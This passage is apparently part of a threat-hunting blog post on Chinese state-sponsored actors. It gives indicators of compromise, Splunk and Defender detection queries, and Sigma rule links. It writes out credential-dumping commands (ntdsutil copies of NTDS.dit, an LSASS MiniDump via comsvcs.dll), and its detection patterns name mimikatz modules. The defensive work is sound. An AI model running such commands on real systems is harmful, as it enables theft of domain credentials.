mkdir C:\users\public\Appfile &amp; ntdsutil \”ac i ntds\” ifm \”create full C:\users\public\Appfile\” q q</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="e96f" class="pp ni gv pm b bg pq pr l ps pt">wmic process call create “cmd.exe /c mkdir C:\Windows\Temp\tmp &amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\tmp\”</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="7413" class="pp ni gv pm b bg pq pr l ps pt">wmic process call create “cmd.exe /c ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\Pro”</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="f4ab" class="pp ni gv pm b bg pq pr l ps pt">wmic process call create “ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\”</span></pre><h2 id="d37b" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Command line patterns</h2><p id="659a" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">Certain patterns in commands (with asterisks for wildcards) can be used to identify potentially malicious commands:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="08ee" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /C dir /S \\* &gt;&gt; *</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="d720" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /Q /c * 1&gt; \\127.0.0.1\ADMIN$\__*.*&gt;&amp;1</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="3350" class="pp ni gv pm b bg pq pr l ps pt">powershell start-process -filepath c:\windows\temp\*.exe — windowstyle hidden</span></pre><h2 id="bdf7" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">File paths</h2><p id="1b21" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">The most common paths where files and executables used by the actor have been found include:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="94ef" class="pp ni gv pm b bg pq pr l ps pt">C:\Users\Public\Appfile (including subdirectories)</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="02d4" class="pp ni gv pm b bg pq pr l ps pt">C:\Perflogs (including subdirectories)</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="85ba" class="pp ni gv pm b bg pq pr l ps pt">C:\Windows\Temp (including subdirectories)</span></pre><h2 id="477a" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">File Names</h2><p id="e641" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">The file names the actor has previously used for such things as malware, scripts, and tools include:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="6f9b" class="pp ni gv pm b bg pq pr l ps pt">backup.bat</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="c4fd" class="pp ni gv pm b bg pq pr l ps pt">cl64.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="45f7" class="pp ni gv pm b bg pq pr l ps pt">update.bat</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="5a0d" class="pp ni gv pm b bg pq pr l ps pt">Win.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="2a1e" class="pp ni gv pm b bg pq pr l ps pt">billagent.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="c1e4" class="pp ni gv pm b bg pq pr l ps pt">nc.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="5560" class="pp ni gv pm b bg pq pr l ps pt">update.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="02ad" class="pp ni gv pm b bg pq pr l ps pt">WmiPrvSE.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="cae6" class="pp ni gv pm b bg pq pr l ps pt">billaudit.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="22cc" class="pp ni gv pm b bg pq pr l ps pt">rar.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="e2af" class="pp ni gv pm b bg pq pr l ps pt">vm3dservice.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="b614" class="pp ni gv pm b bg pq pr l ps pt">WmiPreSV.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="57d1" class="pp ni gv pm b bg pq pr l ps pt">cisco_up.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="7b39" class="pp ni gv pm b bg pq pr l ps pt">SMSvcService.exe</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="b69b" class="pp ni gv pm b bg pq pr l ps pt">watchdogd.ex</span></pre><p id="b25b" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">In addition to the file names and paths above, malicious files names, believed to be randomly created, in the following format have also been discovered: C:\Windows\[a-zA-Z]{8}.exe</p><h2 id="f898" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">SHA256 file hashes</h2><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="db22" class="pp ni gv pm b bg pq pr l ps pt">f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="06fd" class="pp ni gv pm b bg pq pr l ps pt"> ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="6e5e" class="pp ni gv pm b bg pq pr l ps pt"> d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="6736" class="pp ni gv pm b bg pq pr l ps pt">472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="f6ae" class="pp ni gv pm b bg pq pr l ps pt"> 66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="62ff" class="pp ni gv pm b bg pq pr l ps pt"> 3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="d6f0" class="pp ni gv pm b bg pq pr l ps pt"> 41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="14d8" class="pp ni gv pm b bg pq pr l ps pt"> c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="9d85" class="pp ni gv pm b bg pq pr l ps pt"> 3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="2e0b" class="pp ni gv pm b bg pq pr l ps pt"> fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15</span></pre><pre class="qo pl pm pn bp po bb bk"><span id="86bf" class="pp ni gv pm b bg pq pr l ps pt"> ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484</span></pre><h2 id="786d" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">User Agent</h2><p id="8c0b" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">In some cases, the following user-agent string (including the extra spacing) was identified performing reconnaissance activities by this actor:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="0dd0" class="pp ni gv pm b bg pq pr l ps pt">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0</span></pre><p id="61d5" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Note: The spacing between “)” and “Gecko” is 3 tabs followed by 4 spaces.</p><h2 id="41a8" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">RUNDLL32</h2><blockquote class="ow ox oy"><p id="e65c" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Chinese state-sponsored cyber actors were observed using Microsoft signed binaries, such as Rundll32, as a proxy to execute malicious payloads. Monitor processes for the execution of known proxy binaries (e.g., rundll32.exe) and look for anomalous activity that does not follow historically good arguments and loaded DLLs associated with the invocation of the binary.</p></blockquote><h2 id="f5b1" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">LSASS T1003.001</h2><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="5120" class="pp ni gv pm b bg pq pr l ps pt">cmd.exe /c powershell -exec bypass -W hidden -nop -E rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 552 C:\Windows\Temp\vmware-vhost.dmp full</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml at master ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="rz l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="d1bf" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="2954" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND (TargetImage=”*\\lsass.exe” AND SourceImage=”C:\\Windows\\System32\\rundll32.exe” AND CallTrace=”*comsvcs.dll*”)</span></pre><h2 id="b213" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Process Injection T1055</h2><blockquote class="ow ox oy"><p id="2a57" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Chinese state-sponsored cyber actors have been observed: Injecting into the rundll32.exe process to hide usage of Mimikatz, as well as injecting into a running legitimate explorer.exe process for lateral movement</p></blockquote><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml at master ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="sa l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="29e0" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="f956" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((CommandLine=”*DumpCreds*” OR CommandLine=”*mimikatz*”) OR (CommandLine=”*::aadcookie*” OR CommandLine=”*::detours*” OR CommandLine=”*::memssp*” OR CommandLine=”*::mflt*” OR CommandLine=”*::ncroutemon*” OR CommandLine=”*::ngcsign*” OR CommandLine=”*::printnightmare*” OR CommandLine=”*::skeleton*” OR CommandLine=”*::preshutdown*” OR CommandLine=”*::mstsc*” OR CommandLine=”*::multirdp*”) OR (CommandLine=”*rpc::*” OR CommandLine=”*token::*” OR CommandLine=”*crypto::*” OR CommandLine=”*dpapi::*” OR CommandLine=”*sekurlsa::*” OR CommandLine=”*kerberos::*” OR CommandLine=”*lsadump::*” OR CommandLine=”*privilege::*” OR CommandLine=”*process::*” OR CommandLine=”*vault::*”))</span></pre><p id="d376" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="c6f5" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((ProcessCommandLine contains @’DumpCreds’ or ProcessCommandLine contains @’mimikatz’) or (ProcessCommandLine contains @’::aadcookie’ or ProcessCommandLine contains @’::detours’ or ProcessCommandLine contains @’::memssp’ or ProcessCommandLine contains @’::mflt’ or ProcessCommandLine contains @’::ncroutemon’ or ProcessCommandLine contains @’::ngcsign’ or ProcessCommandLine contains @’::printnightmare’ or ProcessCommandLine contains @’::skeleton’ or ProcessCommandLine contains @’::preshutdown’ or ProcessCommandLine contains @’::mstsc’ or ProcessCommandLine contains @’::multirdp’) or (ProcessCommandLine contains @’rpc::’ or ProcessCommandLine contains @’token::’ or ProcessCommandLine contains @’crypto::’ or ProcessCommandLine contains @’dpapi::’ or ProcessCommandLine contains @’sekurlsa::’ or ProcessCommandLine contains @’kerberos::’ or ProcessCommandLine contains @’lsadump::’ or ProcessCommandLine contains @’privilege::’ or ProcessCommandLine contains @’process::’ or ProcessCommandLine contains @’vault::’))</span></pre><h2 id="86b9" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">Schtask</h2><blockquote class="ow ox oy"><p id="03ba" class="od oe oz of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Chinese state-sponsored cyber actors have been observed using Cobalt Strike, webshells, or command line interface tools, such as schtask or crontab to create and schedule tasks that enumerate victim devices and networks. Note: this technique also applies to Persistence [TA0003] and Privilege Escalation [TA0004]. Monitor scheduled task creation from common utilities using command-line invocation and compare for any changes that do not correlate with known software, patch cycles, or other administrative activity. Configure event logging for scheduled task creation and monitor process execution from <strong class="of gw">svchost.exe (Windows 10) and Windows Task Scheduler </strong>(Older version of Windows) to look for changes in <strong class="of gw">%systemroot%\System32\Tasks</strong> that do not correlate with known software, patch cycles, or other administrative activity. Additionally monitor for any <strong class="of gw">scheduled tasks created</strong> <em class="gv">via command line utilities</em> — such as <strong class="of gw">PowerShell</strong> or <strong class="of gw">Windows Management Instrumentation (WMI)</strong> — that do not conform to typical administrator or user actions.</p></blockquote><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml at master ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="sb l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="0fe3" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="58f7" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\schtasks.exe’ and ProcessCommandLine contains @’ /create ‘) and not (((InitiatingProcessAccountName contains @’AUTHORI’ or InitiatingProcessAccountName contains @’AUTORI’) or (InitiatingProcessAccountDomain contains @’AUTHORI’ or InitiatingProcessAccountDomain contains @’AUTORI’))))</span></pre><p id="db83" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="3877" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\schtasks.exe” AND CommandLine=”* /create *”) AND NOT (User=”*AUTHORI*” OR User=”*AUTORI*”)) | table CommandLine,ParentCommandLine</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/taskscheduler/win_taskscheduler_lolbin_execution_via_task_scheduler.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/builtin/taskscheduler/win_taskscheduler_lolbin_execution_via_task_scheduler.yml…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="sc l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="08eb" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="c175" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:Microsoft-Windows-TaskScheduler/Operational” AND (EventCode=”129&quot; AND (Path=”*\\calc.exe” OR Path=”*\\cscript.exe” OR Path=”*\\mshta.exe” OR Path=”*\\mspaint.exe” OR Path=”*\\notepad.exe” OR Path=”*\\regsvr32.exe” OR Path=”*\\wscript.exe”))</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader_encoded.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader_encoded.yml at master ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="sd l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="7764" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="5d5d" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\schtasks.exe” OR OriginalFileName=”schtasks.exe”) AND CommandLine=”*/Create*” AND (CommandLine=”*FromBase64String*” OR CommandLine=”*encodedcommand*”) AND (CommandLine=”*Get-ItemProperty*” OR CommandLine=”* gp *”) AND (CommandLine=”*HKCU:*” OR CommandLine=”*HKLM:*” OR CommandLine=”*registry::*” OR CommandLine=”*HKEY_*”))</span></pre><p id="0365" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="93c3" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\schtasks.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’schtasks.exe’ or ProcessVersionInfoOriginalFileName =~ @’schtasks.exe’) and ProcessCommandLine contains @’/Create’ and (ProcessCommandLine contains @’FromBase64String’ or ProcessCommandLine contains @’encodedcommand’) and (ProcessCommandLine contains @’Get-ItemProperty’ or ProcessCommandLine contains @’ gp ‘) and (ProcessCommandLine contains @’HKCU:’ or ProcessCommandLine contains @’HKLM:’ or ProcessCommandLine contains @’registry::’ or ProcessCommandLine contains @’HKEY_’))</span></pre><div class="pu pv pw px py pz"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_folder_combos.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">sigma/rules/windows/process_creation/proc_creation_win_schtasks_folder_combos.yml at master ·…</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">github.com</p></div></div><div class="qi l"><div class="se l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="ab4c" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">MDE:</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="baa0" class="pp ni gv pm b bg pq pr l ps pt">DeviceProcessEvents | where ((FolderPath endswith @’\schtasks.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’schtasks.exe’ or ProcessVersionInfoOriginalFileName =~ @’schtasks.exe’) and ProcessCommandLine contains @’ /create ‘ and (ProcessCommandLine contains @’powershell’ or ProcessCommandLine contains @’pwsh’ or ProcessCommandLine contains @’cmd /c ‘ or ProcessCommandLine contains @’cmd /k ‘ or ProcessCommandLine contains @’cmd /r ‘ or ProcessCommandLine contains @’cmd.exe /c ‘ or ProcessCommandLine contains @’cmd.exe /k ‘ or ProcessCommandLine contains @’cmd.exe /r ‘) and (ProcessCommandLine contains @’C:\ProgramData\’ or ProcessCommandLine contains @’%ProgramData%’))</span></pre><p id="faf9" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Splunk</p><pre class="pg ph pi pj pk pl pm pn bp po bb bk"><span id="6402" class="pp ni gv pm b bg pq pr l ps pt">index=* source=”WinEventLog:*” AND ((Image=”*\\schtasks.exe” OR OriginalFileName=”schtasks.exe”) AND CommandLine=”* /create *” AND (CommandLine=”*powershell*” OR CommandLine=”*pwsh*” OR CommandLine=”*cmd /c *” OR CommandLine=”*cmd /k *” OR CommandLine=”*cmd /r *” OR CommandLine=”*cmd.exe /c *” OR CommandLine=”*cmd.exe /k *” OR CommandLine=”*cmd.exe /r *”) AND (CommandLine=”*C:\\ProgramData\\*” OR CommandLine=”*%Progr</span></pre><h2 id="3741" class="nh ni gv bf nj nk nl dy nm nn no ea np nq nr ns nt nu nv nw nx ny nz oa ob oc bk">D3fend CAD</h2><p id="f61d" class="pw-post-body-paragraph od oe gv of b ht og oh oi hw oj ok ol nq om on oo nu op oq or ny os ot ou ov go bk">You want to understand and visualize which artifacts, processes, EventIDs and API’s are relevant for detecting or preventing attacks like AD and ntds.dit and which countermeasure you could take?</p><p id="c6e6" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Try CAD, it is a versatile tool designed to support many modeling and graphing use cases. A CAD graph serves as a realization of the D3FEND ontology, representing specific instances of the ontology’s classes and relationships.</p><figure class="pg ph pi pj pk si sf sg paragraph-image"><div role="button" tabindex="0" class="sj sk fj sl bh sm"><div class="sf sg sh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZK1JsZwQFLuKJif9jE-KeA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZK1JsZwQFLuKJif9jE-KeA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ZK1JsZwQFLuKJif9jE-KeA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ZK1JsZwQFLuKJif9jE-KeA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZK1JsZwQFLuKJif9jE-KeA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZK1JsZwQFLuKJif9jE-KeA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZK1JsZwQFLuKJif9jE-KeA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*ZK1JsZwQFLuKJif9jE-KeA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ZK1JsZwQFLuKJif9jE-KeA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ZK1JsZwQFLuKJif9jE-KeA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ZK1JsZwQFLuKJif9jE-KeA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ZK1JsZwQFLuKJif9jE-KeA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ZK1JsZwQFLuKJif9jE-KeA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ZK1JsZwQFLuKJif9jE-KeA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mo sn c" width="700" height="371" loading="lazy" role="presentation"/></picture></div></div><figcaption class="so ff sp sf sg sq sr bf b bg z du">Relationships NTDS.dit</figcaption></figure><div class="pu pv pw px py pz"><a href="https://d3fend.mitre.org/cad/?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">D3FEND CAD Tool</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Cyber Attack-Defense Utility for Capturing Engagements and Understandable Scenarios</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">d3fend.mitre.org</p></div></div></div></a></div><p id="e972" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Documentation</p><div class="pu pv pw px py pz"><a href="https://d3fend.mitre.org/cad/docs/?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qa ab jk"><div class="qb ab co cb qc qd"><h2 class="bf gw jb z jq qe js jt qf jv jx gu bk">D3FEND CAD User Guide</h2><div class="qg l"><h3 class="bf b jb z jq qe js jt qf jv jx du">Put the D3FEND ontology into action with the D3FEND CAD Tool! CAD is a versatile tool designed to support many modeling…</h3></div><div class="qh l"><p class="bf b dv z jq qe js jt qf jv jx du">d3fend.mitre.org</p></div></div><div class="qi l"><div class="ss l qk ql qm qi qn mo pz"></div></div></div></a></div><p id="ea5c" class="pw-post-body-paragraph od oe gv of b ht pa oh oi hw pb ok ol nq pc on oo nu pd oq or ny pe ot ou ov go bk">Examples can be load directly from CAD</p><figure class="pg ph pi pj pk si sf sg paragraph-image"><div role="button" tabindex="0" class="sj sk fj sl bh sm"><div class="sf sg st"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*upmtfO5XLTj3142EtqpgAA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*upmtfO5XLTj3142EtqpgAA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*upmtfO5XLTj3142EtqpgAA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*upmtfO5XLTj3142EtqpgAA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*upmtfO5XLTj3142EtqpgAA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*upmtfO5XLTj3142EtqpgAA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*upmtfO5XLTj3142EtqpgAA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 